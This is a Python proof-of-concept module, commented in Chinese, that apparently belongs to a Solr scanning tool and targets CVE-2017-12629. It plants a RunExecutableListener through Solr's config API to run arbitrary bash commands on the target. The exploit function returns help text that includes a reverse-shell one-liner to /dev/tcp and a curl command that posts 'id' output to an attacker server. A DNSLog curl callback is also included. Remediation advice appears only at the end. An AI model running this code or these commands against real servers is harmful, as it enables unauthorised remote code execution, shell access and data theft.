#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr CVE-2017-12629 漏洞检测模块
Apache Solr XML实体注入与RCE漏洞
"""

import logging
import json
import re
import time
from urllib.parse import urlparse

# 日志配置
logger = logging.getLogger(__name__)

def check(scanner, core=None, dnslog_domain=None):
    """
    检测CVE-2017-12629 XML实体注入与RCE漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        dnslog_domain: 用于验证漏洞的DNSLog域名
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        # 参数校验
        if not scanner or not hasattr(scanner, 'target_url'):
            return False, "无效的扫描器实例"
        
        logger.info(f"检测CVE-2017-12629漏洞，目标: {scanner.target_url}")
        
        # 获取Solr信息，检查版本
        info = scanner.get_solr_info()
        version = scanner.version if hasattr(scanner, 'version') and scanner.version else "未知"
        
        # 检查版本是否在受影响范围内
        version_vulnerable = False
        if version != "未知":
            try:
                version_parts = version.split('.')
                major_version = int(version_parts[0])
                minor_version = int(version_parts[1])
                
                if major_version < 7 or (major_version == 7 and minor_version < 1):
                    version_vulnerable = True
                    logger.info(f"Solr版本 {version} 在CVE-2017-12629漏洞影响范围内")
                else:
                    logger.info(f"Solr版本 {version} 不在CVE-2017-12629漏洞影响范围内")
            except (ValueError, IndexError):
                logger.warning(f"无法解析Solr版本: {version}")
        
        # 获取核心列表
        cores_to_check = []
        if core:
            cores_to_check = [core]
            logger.info(f"使用指定核心: {core}")
        else:
            cores = scanner.get_cores()
            if cores:
                cores_to_check = cores
                logger.info(f"获取到 {len(cores)} 个Solr核心")
            else:
                logger.warning("未获取到Solr核心列表")
        
        if not cores_to_check:
            return False, "未发现可用的Solr核心，请手动指定核心名称"
        
        # 如果提供了DNSLog域名，使用DNSLog方式验证
        if dnslog_domain:
            logger.info(f"使用DNSLog方式验证漏洞，DNSLog域名: {dnslog_domain}")
            return check_with_dnslog(scanner, cores_to_check[0], dnslog_domain)
        
        # 使用常规方式验证
        for core_name in cores_to_check:
            logger.info(f"检测核心 {core_name} 是否存在CVE-2017-12629漏洞")
            
            # 构造测试payload
            listener_name = f"detectListener_{int(time.time())}"
            
            # 添加postCommit listener
            payload = {
                "add-listener": {
                    "event": "postCommit",
                    "name": listener_name,
                    "class": "solr.RunExecutableListener",
                    "exe": "echo",
                    "dir": "/bin/",
                    "args": ["SolrScanTest"]
                }
            }
            
            headers = {"Content-Type": "application/json"}
            logger.info(f"向核心 {core_name} 添加测试listener")
            resp = scanner.request(
                "POST", 
                f"/solr/{core_name}/config", 
                json=payload, 
                headers=headers
            )
            
            if not resp:
                logger.warning(f"添加listener请求失败，未收到响应")
                continue
            
            if resp.status_code != 200:
                logger.warning(f"添加listener请求失败，状态码: {resp.status_code}")
                continue
            
            if "errorMessages" in resp.text:
                logger.warning(f"添加listener请求返回错误: {resp.text}")
                continue
            
            # 触发执行
            logger.info(f"触发核心 {core_name} 的listener执行")
            resp = scanner.request(
                "POST", 
                f"/solr/{core_name}/update", 
                json=[{"id": "trigger"}], 
                headers=headers
            )
            
            if resp and resp.status_code == 200:
                logger.info(f"核心 {core_name} 存在CVE-2017-12629漏洞")
                return True, f"核心 {core_name} 存在CVE-2017-12629 XML实体注入与RCE漏洞"
        
        # 如果所有核心都检测完毕但未发现漏洞
        if version_vulnerable:
            return False, f"Solr版本 {version} 在漏洞影响范围内，但未检测到CVE-2017-12629漏洞"
        else:
            return False, f"未检测到CVE-2017-12629漏洞"
    except Exception as e:
        logger.error(f"检测CVE-2017-12629异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def check_with_dnslog(scanner, core_name, dnslog_domain):
    """
    使用DNSLog方式验证CVE-2017-12629漏洞
    
    Args:
        scanner: SolrScanner实例
        core_name: 核心名称
        dnslog_domain: DNSLog域名
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        # 参数校验
        if not dnslog_domain:
            return False, "请提供有效的DNSLog域名"
        
        # 构造执行命令：向DNSLog域发送请求
        random_id = int(time.time())
        cmd = f"curl http://{random_id}.{dnslog_domain}"
        listener_name = f"dnslogListener_{random_id}"
        
        logger.info(f"使用DNSLog方式验证漏洞，命令: {cmd}")
        
        # 添加postCommit listener
        payload = {
            "add-listener": {
                "event": "postCommit",
                "name": listener_name,
                "class": "solr.RunExecutableListener",
                "exe": "bash",
                "dir": "/bin/",
                "args": ["-c", cmd]
            }
        }
        
        headers = {"Content-Type": "application/json"}
        resp = scanner.request(
            "POST", 
            f"/solr/{core_name}/config", 
            json=payload, 
            headers=headers
        )
        
        if not resp:
            return False, "添加listener请求失败，未收到响应"
        
        if resp.status_code != 200:
            return False, f"添加listener请求失败，状态码: {resp.status_code}"
        
        if "errorMessages" in resp.text:
            return False, f"添加listener请求返回错误: {resp.text}"
        
        # 触发执行
        logger.info(f"触发核心 {core_name} 的listener执行")
        resp = scanner.request(
            "POST", 
            f"/solr/{core_name}/update", 
            json=[{"id": "trigger"}], 
            headers=headers
        )
        
        if resp and resp.status_code == 200:
            logger.info(f"DNSLog请求已发送，请检查 {random_id}.{dnslog_domain}")
            return True, f"已发送DNSLog请求，请在{dnslog_domain}平台查看是否有来自{random_id}的请求记录（可能需等待一分钟）"
        
        return False, "触发listener执行失败，可能不存在漏洞"
    except Exception as e:
        logger.error(f"使用DNSLog验证CVE-2017-12629异常: {str(e)}")
        return False, f"验证异常: {str(e)}"

def exploit(scanner, core=None, command=None):
    """
    利用CVE-2017-12629漏洞执行命令
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时使用第一个可用核心
        command: 要执行的命令
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    try:
        # 参数校验
        if not scanner or not hasattr(scanner, 'target_url'):
            return False, "无效的扫描器实例"
        
        if not command:
            return False, "请提供要执行的命令，例如: id 或 whoami"
        
        logger.info(f"利用CVE-2017-12629漏洞执行命令: {command}")
        
        # 获取可用的核心
        cores = []
        if core:
            cores = [core]
            logger.info(f"使用指定核心: {core}")
        else:
            available_cores = scanner.get_cores()
            if available_cores:
                cores = available_cores
                logger.info(f"获取到 {len(cores)} 个Solr核心")
            else:
                logger.warning("未获取到Solr核心列表")
        
        if not cores:
            return False, "未发现可用的Solr核心，请手动指定核心名称"
        
        core_name = cores[0]
        logger.info(f"使用核心 {core_name} 尝试执行命令")
        
        # 创建唯一的listener名称
        listener_name = f"exploitListener_{int(time.time())}"
        
        # 添加postCommit listener
        payload = {
            "add-listener": {
                "event": "postCommit",
                "name": listener_name,
                "class": "solr.RunExecutableListener",
                "exe": "bash",
                "dir": "/bin/",
                "args": ["-c", command]
            }
        }
        
        headers = {"Content-Type": "application/json"}
        logger.info(f"向核心 {core_name} 添加命令执行listener")
        resp = scanner.request(
            "POST", 
            f"/solr/{core_name}/config", 
            json=payload, 
            headers=headers
        )
        
        if not resp:
            return False, "添加listener请求失败，未收到响应"
        
        if resp.status_code != 200:
            return False, f"添加listener请求失败，状态码: {resp.status_code}"
        
        if "errorMessages" in resp.text:
            return False, f"添加listener请求返回错误: {resp.text}"
        
        # 触发执行
        logger.info(f"触发核心 {core_name} 的listener执行")
        resp = scanner.request(
            "POST", 
            f"/solr/{core_name}/update", 
            json=[{"id": "trigger"}], 
            headers=headers
        )
        
        if resp and resp.status_code == 200:
            # 尝试获取命令执行结果
            # 注意：由于RunExecutableListener的特性，命令执行结果通常不会直接返回
            # 这里只能返回执行状态，实际结果需要通过其他方式获取（如反弹shell或DNSLog）
            logger.info(f"命令 '{command}' 已执行")
            
            # 提供用户指导
            guidance = f"""
命令 '{command}' 已成功执行。

注意：由于Apache Solr RunExecutableListener的特性，命令执行结果不会直接返回。
您可以通过以下方式获取执行结果：

1. 如果是查询类命令，可以尝试将结果写入Solr服务器上的临时文件
   例如：执行 "id > /tmp/result.txt"，然后使用文件读取漏洞读取该文件

2. 使用反弹Shell获取交互式会话
   例如：执行 "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"

3. 使用DNSLog等方式进行带外数据传输
   例如：执行 "curl http://YOUR_COMMAND_OUTPUT.YOUR_DNSLOG_DOMAIN"

4. 如果目标可以访问互联网，可以将结果发送到您控制的服务器
   例如：执行 "curl -d \"$(id)\" http://YOUR_SERVER/collect"
"""
            return True, guidance
        else:
            return False, "命令执行失败，可能不存在漏洞或已修复"
    except Exception as e:
        logger.error(f"利用CVE-2017-12629异常: {str(e)}")
        return False, f"利用异常: {str(e)}"

def get_required_params():
    """
    获取漏洞利用所需参数
    
    Returns:
        dict: 参数说明字典
    """
    return {
        "check": {
            "core": "Solr核心名称，如不提供将自动检测所有核心",
            "dnslog_domain": "用于验证漏洞的DNSLog域名，如不提供将使用常规方式验证"
        },
        "exploit": {
            "core": "Solr核心名称，如不提供将使用第一个可用核心",
            "command": "要执行的命令，例如: id 或 whoami"
        }
    }

def get_poc_info():
    """
    获取POC信息
    
    Returns:
        dict: POC信息字典
    """
    return {
        "name": "Apache Solr XML实体注入与RCE",
        "CVE": "CVE-2017-12629",
        "severity": "高危",
        "affected_versions": "< 7.1.0",
        "description": "Apache Solr存在XML实体注入和远程命令执行漏洞，攻击者可通过构造特殊请求执行任意命令。",
        "details": """
Apache Solr 7.1.0之前版本中存在XML外部实体注入(XXE)和远程命令执行(RCE)漏洞。
攻击者可以通过发送特制的HTTP请求，利用RunExecutableListener执行任意命令。

漏洞利用步骤:
1. 通过ConfigAPI添加一个RunExecutableListener
2. 触发listener执行命令
3. 服务器执行指定的命令

修复方法:
- 升级到Apache Solr 7.1.0或更高版本
- 限制对Solr管理接口的访问
- 禁用RunExecutableListener功能
        """,
        "references": [
            "https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE",
            "https://issues.apache.org/jira/browse/SOLR-11685",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-12629"
        ]
    }
